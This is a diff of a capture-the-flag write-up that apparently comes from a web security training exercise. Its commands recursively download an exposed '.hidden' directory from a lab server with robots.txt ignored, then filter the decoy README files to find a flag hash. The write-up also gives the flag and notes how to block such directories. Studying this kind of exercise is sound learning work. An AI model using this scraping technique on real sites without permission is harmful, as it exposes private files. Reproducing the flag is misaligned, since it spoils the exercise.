@@ -1,11 +1,11 @@
-wget
+# Hidden files and directories
 
-https://stackoverflow.com/questions/273743/using-wget-to-recursively-fetch-a-directory-with-arbitrary-files-in-it
+## Notes
 
+```bash
 wget -rkpN -e robots=off http://192.168.1.86/.hidden/
 wget --recursive --no-parent http://192.168.1.86/.hidden/  
 wget ‐‐recursive ‐‐no-clobber ‐‐no-parent http://192.168.1.86/.hidden/
-
 
 find 192.168.1.86/.hidden -name "README"
 
@@ -17,20 +17,25 @@ sed -n '/Demande/!p' 1 > 2
 sed -n '/Tu/!p' 2 > 3    
 sed -n '/Non/!p' 3 > 4
 sed -n '/Tou/!p' 4 > 5
+```
 
 99dde1d35d1fdd283924d84e6d9f1d820
 
+we double check this.
+
+```bash
 grep -rnw '192.168.1.86/.hidden' -e '99dde1d35d1fdd283924d84e6d9f1d820'
 192.168.1.86/.hidden/whtccjokayshttvxycsvykxcfm/igeemtxnvexvxezqwntmzjltkt/lmpanswobhwcozdqixbowvbrhw/README:1:99dde1d35d1fdd283924d84e6d9f1d820
-
-https://decryptpassword.com/encrypt/1624782-99dde1d35d1fdd283924d84e6d9f1d820.html
+```
 
 sha256: d5eec3ec36cf80dce44a896f961c1831a05526ec215693c8f2c39543497d4466
 
-Expliquer la faille
-Idem flag11, les visiteurs ne devraient pas avoir accès à ce genre de dossiers, uniquement au site web.
+##Correction
 
-Comment la corriger
-Les fichier ou dossiers .hidden ne sont pas censées contenir d'informations importantes. Ils sont généralement utilisés pour sauvegarder des préférences utilisateur ou des états utilitaires.
-Ils ne sont pas sécurisés car leur accès n'est pas restreint, mais cela pourrait se faire simplement avec un fichier .htaccess.
+this is a admin area normally need to be block for users,
+this kind of files they dont need to have important context
 
+## Info
+
+[wget](https://stackoverflow.com/questions/273743/using-wget-to-recursively-fetch-a-directory-with-arbitrary-files-in-it)<br/>
+[decryptpassword](https://decryptpassword.com/encrypt/1624782-99dde1d35d1fdd283924d84e6d9f1d820.html)<br/>
